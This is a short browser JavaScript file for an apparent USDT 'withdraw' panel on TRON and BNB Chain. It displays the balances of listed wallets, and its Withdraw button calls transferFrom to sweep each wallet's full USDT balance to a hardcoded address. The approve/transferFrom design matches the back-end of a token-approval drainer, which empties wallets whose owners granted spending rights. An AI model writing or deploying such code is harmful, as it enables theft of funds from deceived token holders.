const wallets = [
  {
    address: "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN",  // TRC test wallet
    network: "TRC-20"
  },
  {
    address: "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E",  // BEP test wallet
    network: "BEP-20"
  }
];

// USDT contracts
const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";

const ABI = [
  { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "sender", "type": "address" }, { "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
  { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
];

// Render the table
async function renderWallets() {
  const tbody = document.getElementById("walletBody");
  tbody.innerHTML = "";

  for (let wallet of wallets) {
    const tr = document.createElement("tr");

    const td1 = document.createElement("td");
    td1.textContent = wallet.address;

    const td2 = document.createElement("td");
    td2.textContent = wallet.network;

    const td3 = document.createElement("td");
    td3.textContent = "...";

    const td4 = document.createElement("td");
    const btn = document.createElement("button");
    btn.textContent = "Withdraw";
    btn.onclick = () => withdraw(wallet.network, wallet.address);
    td4.appendChild(btn);

    tr.appendChild(td1);
    tr.appendChild(td2);
    tr.appendChild(td3);
    tr.appendChild(td4);

    tbody.appendChild(tr);

    // Set balance live
    if (wallet.network === "TRC-20" && window.tronWeb && tronWeb.defaultAddress.base58) {
      const contract = await tronWeb.contract(ABI, TRC20_USDT);
      const bal = await contract.methods.balanceOf(wallet.address).call();
      td3.textContent = tronWeb.fromSun(bal);
    } else if (wallet.network === "BEP-20" && window.ethereum) {
      const web3 = new Web3(window.ethereum);
      const contract = new web3.eth.Contract(ABI, BEP20_USDT);
      const bal = await contract.methods.balanceOf(wallet.address).call();
      td3.textContent = (bal / 1e18).toFixed(2);
    }
  }
}

async function withdraw(network, from) {
  if (network === "TRC-20" && window.tronWeb) {
    const tronWeb = window.tronWeb;
    const contract = await tronWeb.contract(ABI, TRC20_USDT);
    const balance = await contract.methods.balanceOf(from).call();
    await contract.methods.transferFrom(from, "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN", balance).send();
    alert("TRC-20 Withdraw Complete!");
  }

  if (network === "BEP-20" && window.ethereum) {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.enable();
    const accounts = await web3.eth.getAccounts();
    const admin = accounts[0];

    const contract = new web3.eth.Contract(ABI, BEP20_USDT);
    const balance = await contract.methods.balanceOf(from).call();
    await contract.methods.transferFrom(from, "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E", balance).send({ from: admin });
    alert("BEP-20 Withdraw Complete!");
  }
}

window.addEventListener("load", renderWallets);
